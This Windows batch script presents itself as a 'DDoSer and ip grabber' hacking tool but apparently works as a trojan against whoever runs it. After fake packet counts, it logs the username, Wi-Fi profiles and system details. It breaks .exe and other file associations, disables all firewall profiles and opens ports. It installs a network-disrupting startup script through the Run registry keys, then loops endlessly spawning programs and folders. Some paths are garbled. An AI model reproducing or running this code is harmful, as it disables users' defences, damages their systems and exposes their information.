@echo off
mode 10
color 0a
cls
echo ==========================
Title DDoSer and ip grabber!
echo Hacking Tool
echo Created by Exterminator100
echo You need to run tool as administrator or it won't work
echo ==========================
pause
cls
echo If you don't know what you are doing, close out of this tab!
timeout/t 5 /nobreak >nul

echo Finding IP address...
ipconfig
timeout /t 3 /nobreak >nul
echo .
echo .
echo Enter IP address of victim:
set /p Target: = Target: 
echo DDoSing
echo If you do not want to DDoS then close out of tab.
timeout/t 5 /nobreak >nul
cls
echo DDoSing starting
echo 1 packet sent
timeout/t 1 /nobreak >nul
echo 2 packets sent
timeout/t 1 /nobreak >nul
echo 34 packets sent
timeout/t 1 /nobreak >nul
echo 55 packets sent
timeout/t 1 /nobreak >nul
echo 342 packets sent
timeout/t 1 /nobreak >nul
echo 739 packets sent
timeout/t 1 /nobreak >nul
echo 1344 packets sent
timeout/t 1 /nobreak >nul
echo 1346 packets sent
timeout/t 1 /nobreak >nul
echo 1845 packets sent
timeout/t 1 /nobreak >nul
echo 145145 packets sent
timeout/t 1 /nobreak >nul
echo 31164719 packets sent
echo .
echo .
echo We will inform you when Victim is down!
echo Do NOT close this tab
timeout/t 3 /nobreak >nul
echo Victim is down!
echo Don't close this tab, we are doing expierements on him!
timeout/t 3 /nobreak >nul
echo Real dirty work for trying to DDoS someone.
echo Now you will pay
timeout/t 2 /nobreak >nul
rem Now the trojan will change files to make them not work.
rem The trojan will also open port 1122 in both udp and tcp
rem it will also turn firewalls off
ver>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Username:%username%>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Time: %time%>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Date: %date%>>9K21JM10B.log
msg * Your information is stolen!!
assoc .txt = MER99RDUWFILE
assoc .jpeg = 9LKMFILE
assoc .jpg = NOTAPICTUREFILE
assoc .vbs = ggaieFILE
assoc .exe = NOTANAPPLICATIONFILE
ECHO.>>9K21JM10B.log
netsh wlan show profiles>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ipconfig>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Additional Information:>>9K21JM10B.log
ipconfig | find /i "IPv4">>9K21JM10B.log
wmic diskdrive get size>>9K21JM10B.log
wmic cpu get name>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO.>>9K21JM10B.log
systeminfo>>9K21JM10B.log
goto ports
rem -=- Opens Port 1122 -=-
:ports
cls & color 0a
netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=%1
netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=%1
goto firewall
rem -=- Turns all Firewalls off -=-
:firewall
cls & color 0a
netsh firewall set opmode disable
netsh firewall set opmode mode=DISABLE
netsh advfirewall set currentprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set allprofiles state off
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo Don't try to hack or DDoS ever again, I hope you learned your lesson you naughty black hat hacker.
goto x



:x
@echo off
start calculator
start command prompt
start Notepad
start https://www.youtube.com/channel/UCJmwzfUweWlynmmF4G8R7WA
md%random%
/folder.
goto x
